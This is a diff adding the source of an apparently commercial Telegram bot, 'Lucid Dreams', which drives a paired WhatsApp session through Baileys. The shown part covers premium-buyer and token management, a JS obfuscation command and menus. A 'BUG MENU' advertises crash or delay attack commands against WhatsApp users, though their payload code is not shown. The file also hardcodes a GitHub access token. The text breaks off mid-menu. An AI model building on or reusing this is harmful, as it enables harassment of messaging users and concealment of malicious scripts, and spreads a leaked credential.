@@ -1,0 +1,1288 @@
+const { Telegraf } = require("telegraf");
+const fs = require('fs');
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    downloadContentFromMessage,
+    generateWAMessageContent,
+    generateWAMessage,
+    DisconnectReason,
+    makeInMemoryStore,
+    prepareWAMessageMedia,
+    fetchLatestBaileysVersion,
+    generateWAMessageFromContent
+} = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const crypto = require('crypto');
+const chalk = require('chalk');
+const axios = require('axios');
+const JsConfuser = require('js-confuser');
+const { tokenBot, ownerID } = require("./settings/config");
+const moment = require('moment-timezone');
+// ======== [ GITHUB INTEGRATION MVII ] =================
+const owner = "marsel5656";
+const repo = "Marsel";
+const tokenPath = "token.json";
+const moderatorsPath = "moderator.json";
+const githubToken = "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";
+const developerId = "7688664500";
+const developerIds = [developerId, "7043363273", "7688664500"]; 
+
+async function loadOctokit() {
+    const { Octokit } = await import('@octokit/rest');
+    return new Octokit({ auth: githubToken });
+}
+//============================================S
+
+const question = (query) => new Promise((resolve) => {
+    const rl = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    rl.question(query, (answer) => {
+        rl.close();
+        resolve(answer);
+    });
+});
+
+async function getGitHubData(path) {
+    const octokit = await loadOctokit();
+    try {
+        const response = await octokit.repos.getContent({
+            owner,
+            repo,
+            path,
+        });
+        const content = Buffer.from(response.data.content, 'base64').toString();
+        return { data: JSON.parse(content), sha: response.data.sha };
+    } catch (error) {
+        console.error("Error fetching :", error);
+        return { data: null, sha: null };
+    }
+}
+
+async function updateGitHubData(path, content, sha) {
+    const octokit = await loadOctokit();
+    try {
+        await octokit.repos.createOrUpdateFileContents({
+            owner,
+            repo,
+            path,
+            message: `Update`,
+            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
+            sha,
+        });
+        console.log(`updated successfully.`);
+    } catch (error) {
+        console.error("Error updating data on GitHub:", error);
+    }
+}
+// ========================= [ TOKEN MANAGEMENT ] =========================
+
+async function addToken(newToken) {
+    const { data: tokens, sha } = await getGitHubData(tokenPath);
+    if (tokens) {
+        tokens.push(newToken);
+        await updateGitHubData(tokenPath, tokens, sha);
+    }
+}
+
+async function deleteToken(tokenToDelete) {
+    const { data: tokens, sha } = await getGitHubData(tokenPath);
+    if (tokens) {
+        const updatedTokens = tokens.filter(token => token !== tokenToDelete);
+        await updateGitHubData(tokenPath, updatedTokens, sha);
+    }
+}
+
+async function isValidToken(token) {
+    const { data: tokens } = await getGitHubData(tokenPath);
+    return tokens && tokens.includes(token);
+}
+
+// ========================= [ MODERATOR MANAGEMENT ] =========================
+
+async function isModerator(userId) {
+    const { data: moderators } = await getGitHubData(moderatorsPath);
+    return moderators && moderators.includes(userId);
+}
+
+async function addModerator(userId) {
+    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
+    if (moderators && !moderators.includes(userId)) {
+        moderators.push(userId);
+        await updateGitHubData(moderatorsPath, moderators, sha);
+    }
+}
+
+async function deleteModerator(userId) {
+    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
+    if (moderators) {
+        const updatedModerators = moderators.filter(id => id !== userId);
+        await updateGitHubData(moderatorsPath, updatedModerators, sha);
+    }
+}
+// ========================= [ BOT INITIALIZATION ] =========================
+
+const bot = new Telegraf(tokenBot);
+let dnz = null;
+let isWhatsAppConnected = false;
+let linkedWhatsAppNumber = '';
+const usePairingCode = true;
+
+// ========================= [ UTILITY FUNCTIONS ] =========================
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+
+// ========================= [ PREMIUM USER MANAGEMENT ] =========================
+
+const premiumFile = './database/premium.json';
+
+const loadPremiumUsers = () => {
+    try {
+        const data = fs.readFileSync(premiumFile);
+        return JSON.parse(data);
+    } catch (err) {
+        return {};
+    }
+};
+
+const savePremiumUsers = (users) => {
+    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
+};
+
+const addPremiumUser = (userId, duration) => {
+    const premiumUsers = loadPremiumUsers();
+    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
+    premiumUsers[userId] = expiryDate;
+    savePremiumUsers(premiumUsers);
+    return expiryDate;
+};
+
+const removePremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    delete premiumUsers[userId];
+    savePremiumUsers(premiumUsers);
+};
+
+const isPremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    if (premiumUsers[userId]) {
+        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
+        if (moment().isBefore(expiryDate)) {
+            return true;
+        } else {
+            removePremiumUser(userId);
+            return false;
+        }
+    }
+    return false;
+};
+
+// ========================= [ BAILEYS CONNECTION ] =========================
+
+const startSesi = async () => {
+    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    const { version } = await fetchLatestBaileysVersion();
+
+    const connectionOptions = {
+        version,
+        keepAliveIntervalMs: 30000,
+        printQRInTerminal: !usePairingCode,
+        logger: pino({ level: "silent" }),
+        auth: state,
+        browser: ['Mac OS', 'Safari', '10.15.7'],
+        getMessage: async (key) => ({
+            conversation: 'Succes Connected',
+        }),
+    };
+
+    dnz = makeWASocket(connectionOptions);
+    
+    if (usePairingCode && !dnz.authState.creds.registered) {
+        console.clear();
+        let phoneNumber = await question(chalk.bold.white(`\nToken Anda Terdaftar Masukan Code Whatsapp Daei 62xxx\n`));
+        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+        const pair = "D4NZK3C3" // only 8 digit numbers or letters (no more or less)
+        const code = await dnz.requestPairingCode(phoneNumber.trim());
+        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+        console.log(chalk.bold.white(`kode anda :`), chalk.bold.white(formattedCode));
+    }
+
+    dnz.ev.on('creds.update', saveCreds);
+    store.bind(dnz.ev);
+
+    dnz.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+
+        if (connection === 'open') {
+            console.clear();
+            isWhatsAppConnected = true;
+            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
+            console.log(`\n
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠚⣷⠀⠀⣀⣤⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⣟⢀⡴⠋⠀⠀⣿⠖⠋⢀⡏⠀⠀⠀⡀⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⡀⡼⠀⢸⡟⡸⠀⠀⠀⠃⠀⠀⢸⡧⠜⠛⠛⣻⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢺⢾⡃⠀⠈⣴⠁⢻⡀⠀⠀⢀⡠⠀⠀⠀⠀⢸⣇⣤⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠸⡜⠂⠀⠀⣟⠀⢸⠑⠀⠰⠁⠀⠀⠀⠀⠀⠛⠉⡼⠁⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⣷⣾⣿⣿⣿⣿⣾⣶⣶⣤⣀⡀⢰⠕⠋⠀⠀⠸⠧⣤⡄
+⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣔⠈⣤⣶⡚⠁⠀
+⠀⠀⠀⠀⣠⣶⡀⢸⡟⠿⡿⠿⡟⠻⠿⣿⣿⣿⣿⣿⣿⣿⠿⣿⠋⠁⠀⠀⠀
+⠀⠀⠀⢰⢧⡷⡿⢘⡎⠀⠀⠐⣶⢶⣲⠈⠙⠋⠉⠉⠁⡘⡯⣿⡶⣆⡀⠀⠀
+⠀⠀⠀⢾⢈⣼⣿⣤⣿⣶⣶⣶⣿⣿⣧⣤⣄⣀⣀⣤⣾⣿⣿⢯⢇⣿⢳⠀⠀
+⠀⠀⠀⠈⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣷⣬⠏⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠉⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠻⠟⠋⠁⠀⠀⠀
+⠀⠀⠀⠀⢀⣀⣀⡀⣰⣿⣿⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢀⣤⣶⣴⣿⣿⣿⡧⠀⠉⠙⢿⣿⣿⣿⣿⣾⣶⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠉⠛⠛⠿⣿⣿⡇⠀⠀⠀⠀⠻⣿⣿⣿⡿⠿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠸⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`);
+    console.log(chalk.bold.white("Lucid Dreams"));
+    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("DANZZY"));
+    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("2.0\n"));
+    console.log(chalk.bold.green(`\n<!> Lucid Connection Gateway\n< 〤 >Status: Connected Waktu : ${currentTime} Wib\nDeveloper: t.me/danzzydeak\nTerimakasih Telah Menggunakan Script Ini\nBig Thanks To:\n© Vampire\n© Danzzy\n© Elkalah123\n© Byxx ✅`));
+        }
+
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+        console.log(
+                chalk.red('Koneksi WhatsApp terputus.'),
+                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
+            );
+            if (shouldReconnect) {
+                startSesi();
+            }
+            isWhatsAppConnected = false;
+        }
+    });
+};
+
+startSesi();
+
+// Fungsi untuk mendapatkan waktu uptime
+const getUptime = () => {
+    const uptimeSeconds = process.uptime();
+    const hours = Math.floor(uptimeSeconds / 3600);
+    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+    const seconds = Math.floor(uptimeSeconds % 60);
+
+    return `${hours}h ${minutes}m ${seconds}s`;
+};
+
+// ========================= [ MIDDLEWARE ] =========================
+
+const checkWhatsAppConnection = (ctx, next) => {
+    if (!isWhatsAppConnected) {
+        ctx.reply("Nomor sender tidak di temukan atau tidak terhubung");
+        return;
+    }
+    next();
+};
+
+const checkPremium = (ctx, next) => {
+    if (!isPremiumUser(ctx.from.id)) {
+        ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna premium.");
+        return;
+    }
+    next();
+};
+
+// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================
+
+bot.command('addtoken', async (ctx) => {
+    if (!developerIds.includes(String(ctx.from.id))) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /addtoken [token_bot]");
+    }
+    const newToken = args[1];
+    await addToken(newToken);
+    ctx.reply(`✅ Berhasil menambahkan token: ${newToken}`);
+});
+
+bot.command('deltoken', async (ctx) => {
+    if (!developerIds.includes(String(ctx.from.id))) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /deltoken [token_bot]");
+    }
+    const tokenToDelete = args[1];
+    await deleteToken(tokenToDelete);
+    ctx.reply(`✅ Berhasil menghapus token: ${tokenToDelete}`);
+});
+
+// ========================= [ PREMIUM USER MANAGEMENT COMMANDS ] =========================
+
+// /addprem command
+bot.command('addprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) {
+        return ctx.reply("Format: /addprem [user_id] [duration_in_days]");
+    }
+    const userId = args[1];
+    const duration = parseInt(args[2]);
+    if (isNaN(duration)) {
+        return ctx.reply("Durasi harus berupa angka (dalam hari).");
+    }
+    const expiryDate = addPremiumUser(userId, duration);
+    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai pengguna premium hingga ${expiryDate}`);
+});
+
+// /delprem command
+bot.command('delprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /delprem [user_id]");
+    }
+    const userId = args[1];
+    removePremiumUser(userId);
+    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar pengguna premium.`);
+});
+
+// /cekprem command
+bot.command('cekprem', async (ctx) => {
+    const userId = ctx.from.id;
+    if (isPremiumUser(userId)) {
+        const expiryDate = loadPremiumUsers()[userId];
+        ctx.reply(`✅ Anda adalah pengguna premium hingga ${expiryDate}`);
+    } else {
+        ctx.reply(`❌ Anda bukan pengguna premium.`);
+    }
+});
+
+// /listprem command
+bot.command('listprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(`\`\`\`❌ Maaf, hanya owner yang bisa menggunakan perintah ini.\`\`\``);
+    }
+    const premiumUsers = loadPremiumUsers();
+    let message = `Daftar Pengguna Premium:\`\`\`\n`;
+    for (const userId in premiumUsers) {
+        const expiryDate = premiumUsers[userId];
+        message += `\n- ${userId}: ${expiryDate}`;
+    }
+    if (message === `\`\`\`Daftar Pengguna Premium:\`\`\`\n`) {
+        message = `\`\`\`Tidak ada pengguna premium.\`\`\``;
+    }
+    ctx.reply(message, { parse_mode: 'Markdown' });
+});
+
+// COMMAND ENC
+
+bot.command('enchard', async (ctx) => {
+    const replyMessage = ctx.message.reply_to_message;
+
+    console.log(`Perintah diterima: /encrypthard dari pengguna: ${ctx.from.first_name || userId}`);
+
+    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
+        return ctx.reply('😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
+    }
+
+    const fileId = replyMessage.document.file_id;
+    const fileName = replyMessage.document.file_name;
+
+    try {
+        // Dapatkan file
+        const fileLink = await ctx.telegram.getFileLink(fileId);
+        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
+        const codeBuffer = Buffer.from(response.data);
+
+        // Simpan file sementara
+        const tempFilePath = `./@hardenc${fileName}`;
+        fs.writeFileSync(tempFilePath, codeBuffer);
+
+        ctx.reply("Sabar Ya...\n Lagi Di Kerjain Sama Danz Encryptnya...");
+
+        // Enkripsi dengan JsConfuser
+        const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
+            target: "node",
+            preset: "high",
+            compact: true,
+            minify: true,
+            flatten: true,
+            identifierGenerator: function () {
+                const originalString = "肀DanzzyNoDex舀" + "肀DanzOfKing舀";
+                function removeUnwantedChars(input) {
+                    return input.replace(/[^a-zA-Z肀DanzzyNoDexxy舀]/g, '');
+                }
+                function randomString(length) {
+                    let result = '';
+                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+                    for (let i = 0; i < length; i++) {
+                        result += characters.charAt(Math.floor(Math.random() * characters.length));
+                    }
+                    return result;
+                }
+                return removeUnwantedChars(originalString) + randomString(2);
+            },
+            renameVariables: true,
+            renameGlobals: true,
+            stringEncoding: true,
+            stringSplitting: 0.0,
+            stringConcealing: true,
+            stringCompression: true,
+            duplicateLiteralsRemoval: 1.0,
+            shuffle: { hash: 0.0, true: 0.0 },
+            stack: true,
+            controlFlowFlattening: 1.0,
+            opaquePredicates: 0.9,
+            deadCode: 0.0,
+            dispatcher: true,
+            rgf: true,
+            calculator: true,
+            hexadecimalNumbers: true,
+            movedDeclarations: true,
+            objectExtraction: true,
+            globalConcealing: true
+        });
+
+        // Simpan hasil enkripsi
+        fs.writeFileSync(tempFilePath, obfuscatedCode);
+
+        // Kirim hasil
+        await ctx.replyWithDocument({ source: tempFilePath }, {
+            caption: `
+❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
+┃    - 𝗦𝘁𝘆𝗹𝗲: 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 -
+┃              -- 𝗦𝗮𝗳𝗲 & 𝗧𝗶𝗴𝗵𝘁 -
+❒━━━━━━━━━━━━━━━━━━━━❒`
+        });
+
+    } catch (err) {
+        console.error("Gagal enkripsi:", err);
+        ctx.reply("❌ Terjadi kesalahan saat proses enkripsi.");
+    }
+});
+
+// ========================= [ MODERATOR MANAGEMENT COMMANDS ] =========================
+
+bot.command('addmoderatorid', async (ctx) => {
+    if (!developerIds.includes(String(ctx.from.id))) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /addmoderatorid [user_id]");
+    }
+    const userId = args[1];
+    await addModerator(userId);
+    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai moderator.`);
+});
+
+bot.command('delmoderatorid', async (ctx) => {
+    if (!developerIds.includes(String(ctx.from.id))) {
+        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("Format: /delmoderatorid [user_id]");
+    }
+    const userId = args[1];
+    await deleteModerator(userId);
+    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar moderator.`);
+});
+
+// ========================= [ START MESSAGE AND MENU ] =========================
+
+bot.start(ctx => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const menuMessage = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱  THANKS TO ━━━═⬡
+┃ Danz, Vampire, Dev 2
+╰━━━━━━━━━━━━━━━─═⬡
+PRESS THE BUTTON BELOW
+\`\`\``;
+
+    const photoUrl = "https://files.catbox.moe/oropi8.jpg";
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ All Button🌟 ⌟",
+                callback_data: "/allbutton"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    ctx.replyWithPhoto(photoUrl, {
+        caption: menuMessage,
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+});
+
+// ========================= [ OWNER MENU ] =========================
+
+bot.action('/menu', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const ownerMenu = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱ CONTROL MENU ─═⬡
+┃𖤐 /addprem [user_id]
+║𖤐 /delprem [user_id]
+┃𖤐 /cekprem
+║𖤐 /listprem
+┃𖤐 /addtoken [token_bot]
+║𖤐 /deltoken [token_bot]
+┃𖤐 /addmoderatorid [user_id]
+║𖤐 /delmoderatorid [user_id]
+┃𖤐 /enchard [reply_files]
+┗━━━━━━━━━━━━━━━━━━━
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(ownerMenu, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ BACK TO START HANDLER ] =========================
+
+bot.action('/start', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const menuMessage = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱  THANKS TO ━━━═⬡
+┃ Danz, Vampire, Dev 2
+╰━━━━━━━━━━━━━━━─═⬡
+PRESS THE BUTTON BELOW
+\`\`\`
+`;
+
+    const photoUrl = "https://files.catbox.moe/oropi8.jpg";
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ All Button🌟 ⌟",
+                callback_data: "/allbutton"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]   
+    ];
+
+    try {
+        await ctx.editMessageMedia({
+            type: 'photo',
+            media: photoUrl,
+            caption: menuMessage,
+            parse_mode: 'Markdown',
+        }, {
+            reply_markup: {
+               inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ SPECIAL BUG COMMAND ] ========================
+
+bot.action('/bugmenu', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const bugMessage = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱ BUG MENU OP ─═⬡
+┃𖤐 /delayquote (nyerap quote)
+║𖤐 /delayed (super)
+┃𖤐 /delaymenter (xdelay)
+║𖤐 /bulldozerxproto (proto x bull)
+┃𖤐 /fixbug (digunakan untuk fix)
+╰━━━━━━━━━━━━━━━─═⬡
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(bugMessage, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ BUG SPECIAL ] ========================
+
+bot.action('/specialmenu', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const specialMenu = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱ SPECIALY (📵) ─═⬡
+┃𖤐  /combox
+║- tidak disarankan untk spam
+┃karna menggunakan all func
+║mulai dari func delay dan ui
+┃© ʟᴜᴄɪᴅ ᴅʀᴇᴀᴍ
+╰━━━━━━━━━━━━━━━─═⬡
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(specialMenu, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ OWNER MENU ] =========================
+
+bot.action('/infomenu', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const infoMenu = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱ USER INFO ─═⬡
+┃Pengguna : ${ctx.from.first_name}
+║Sender : ${isWhatsAppConnected ? '✅' : '❌'}
+┃Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}
+║Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}
+╰━━━━━━━━━━━━━━━─═⬡
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(infoMenu, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+// ========================= [ OWNER MENU ] =========================
+
+bot.action('/thankto', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const thankMenu = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
+┃ Developer : Danzz
+║ Developer2 : elkalah123
+┃ Version : 2.0
+║ Runtime : ${waktuRunPanel}
+╰━━━━━━━━━━━━━━━─═⬡
+╔━═⊱ INFORMATION ━━═⬡
+┃ 𖤐 ɪᴅ ᴜsᴇʀ : ${userId}
+╰━━━━━━━━━━━━━━━─═⬡
+╔─═⊱ THANKS TO ─═⬡
+┃Danzzy (owner)
+║Elkalah123 (owner 2)
+┃Kenny (support)
+║Rangga (my friend)
+┃All Buyer Lucid Dreams
+╰━━━━━━━━━━━━━━━─═⬡
+\`\`\`
+`;
+
+    const keyboard = [
+        [
+            {
+                text: "⌜ Back✅ ⌟",
+                callback_data: "/start"
+            }
+        ],
+        [
+            {
+                text: "⌜ Developer ⌟",
+                url: "https://t.me/danzzydeak"
+            }
+        ]
+    ];
+
+    try {
+        await ctx.editMessageCaption(thankMenu, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        console.error("Error updating message:", error);
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
+            console.log("Message is not modified. Skipping update.");
+            await ctx.answerCbQuery();
+        } else {
+            await ctx.reply("Terjadi Overload Karena Di Spam");
+        }
+    }
+});
+
+//all button
+bot.action('/allbutton', async (ctx) => {
+const waktuRunPanel = getUptime(); // Waktu uptime panel
+const userId = ctx.from.id;
+    const allMenu = `
+\`\`\`
+╔─═⊱ LUCID DREAMS - OVER ─═⬡
